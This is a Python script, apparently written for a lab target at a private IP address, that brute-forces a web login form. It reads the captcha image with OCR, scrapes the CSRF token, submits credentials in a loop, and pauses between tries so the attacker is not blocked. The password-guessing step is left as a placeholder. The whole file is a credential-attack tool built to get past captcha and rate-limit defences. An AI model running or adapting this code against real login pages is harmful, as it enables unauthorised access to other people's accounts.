import requests
from PIL import Image
from io import BytesIO
import pytesseract
from bs4 import BeautifulSoup
import time

pytesseract.pytesseract.tesseract_cmd = r'C:\Users\USER\AppData\Local\Tesseract-OCR\tesseract.exe'
# Function to solve captcha using pytesseract
def solve_captcha(image_url):
    response = requests.get(image_url)
    img = Image.open(BytesIO(response.content))
    captcha_text = pytesseract.image_to_string(img)
    return captcha_text

# Function to brute force the password
def brute_force_password():
    base_url = "http://192.168.205.128:5000/"  # Update with your actual URL
    session = requests.Session()
    
    while True:
        # Visit login page to get captcha
        login_page = session.get(base_url)
        soup = BeautifulSoup(login_page.content, 'html.parser')
        captcha_image_url = base_url + soup.find('img')['src']
        
        # Download and solve captcha
        captcha_text = solve_captcha(captcha_image_url)
        
        # Extract csrf token
        csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
        
        # Submit login form with brute force password
        login_data = {
            'username': 'username',
            'password': 'password',  # Replace with your brute force password logic
            'captcha': captcha_text,
            'csrf_token': csrf_token
        }
        
        login_response = session.post(base_url, data=login_data)
        
        # Check if login successful
        if login_response.url.endswith('/success'):
            print("Password found:", login_data['password'])
            break
        
        # Delay to avoid being blocked
        time.sleep(1)

# Call the brute force function
brute_force_password()
